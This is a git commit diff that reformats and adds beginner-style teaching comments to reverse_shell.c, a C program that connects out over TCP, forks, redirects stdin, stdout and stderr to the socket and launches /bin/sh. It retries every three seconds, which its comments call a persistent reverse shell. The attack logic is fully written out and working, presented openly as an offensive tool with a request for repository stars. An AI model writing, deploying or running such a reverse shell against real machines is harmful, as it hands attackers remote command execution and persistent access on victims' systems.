c560082343ee640a80ddde949b216bbf92a5b1c3
TheGreen <146537118+TheGreenOfficial@users.noreply.github.com>
2025-12-12 00:23:41 +0545

    Refactor reverse shell code for clarity and consistency

--- reverse_shell.c
+++ reverse_shell.c
@@ -13,10 +13,10 @@ char padding[8]; // this padding is to ensure the custom structure is the same s
 }; // and later we will pass it to connect() after putting values in it in main():
 
 int main(void){ // void means take no arguments form command line eg: ./executable <arg> <arg2>...
-
 while(1){
-int sockhndl = socket(2, 1, 0); // 2 is AF_INET and 1 is SOCK_STREAM (TCP) and 0 is default of tcp somethin like that...
-
+int sockhndl = socket(2, 1, 0); // 2 is AF_INET and 1 is SOCK_STREAM (TCP) and 0 is default of tcp somethin like that..
+//sockhndl is a var to store pid/handle_id which is in intiger or simply a 4-5 digit number that denotes the socket created up earlier using socket() given to us by os/kernel to play around with socket using it.
+//after requesting kernel to create a socket uisng socket(of ipv4 and tcp) then we store handle to a variable we can use that variable to represent our created socket and to actually use it to connect(), send(), receive(), and more...
 struct sockaddr_mine data; // defining sockaddr_mine as data to use inside main()
 memset(&data, 0, sizeof(data)); // Initializing memory to 0 so if any junk was there wipes off and becomes ready to talke our data.
 data.fam = AF_INET; // giving our socket family as ipv4 (AF_INET)
@@ -45,19 +45,20 @@ The current code works on UNIX basically linux and mac but if only in localhost 
   Also you have other options to make your own resolver or use other headers...
 */
 if(connect(sockhndl, (struct sockaddr*)&data, sizeof(data)) == 0){ // connect () takes our struct, a pack of data and connects us to one listerning in that ip and port as we defined if there is no listerner active it exits immediately.
-if(fork() == 0){ // fork to create child process and run our shell from there so if it breaks it will be catched by wait()
-dup2(sockhndl, 0); // stdin to socket
-dup2(sockhndl, 1); //stdout  "   "
-dup2(sockhndl, 2); // stderror "  "
 
-char *argv[] = {"/bin/sh", NULL}; // argv is required in execve() for some reason so we make that and pass it in execve()
-execve("/bin/sh", argv, NULL); // for mac os use zsh for making g one its is in /bin/zsh prefer to spawn this cuz its mac default one but there is sh and bash also.
+if(fork() == 0){ // fork to create child process and run our shell from there so if it breaks it will be catched by wait()
+  dup2(sockhndl, 0); // stdin to socket
+  dup2(sockhndl, 1); //stdout  "   "
+  dup2(sockhndl, 2); // stderror "  "
+
+  char *argv[] = {"/bin/sh", NULL}; // argv is required in execve() for some reason so we make that and pass it in execve()
+  execve("/bin/sh", argv, NULL); // for mac os use zsh for making g one its is in /bin/zsh prefer to spawn this cuz its mac default one but there is sh and bash also.
 }
-close(sockhndl); // after execve() exits for some reason close the handle
-wait(NULL); // wait 4 child to exit after socket handle closed
+  close(sockhndl); // after execve() exits for some reason close the handle
+  wait(NULL); // wait 4 child to exit after socket handle closed
 }
-sleep(3); // after 3 seconds again sends connect() request until re-connected so it becomes a presistence reverse shell...
+  sleep(3); // after 3 seconds again sends connect() request until re-connected so it becomes a presistence reverse shell...
 }
-return 0; // if everythign fails exits if code touches here somehow breaking while loop return is used to break function like break; for loops if this not given still compiles but compiler complains...
+  return 0; // if everythign fails exits if code touches here somehow breaking while loop return is used to break function like break; for loops if this not given still compiles but compiler complains...
 }
 // i guess i tryed to explan as much as i knew hover whoever is reading have liked it and don't forget to leave a star or do something in repo to help/appreciate...
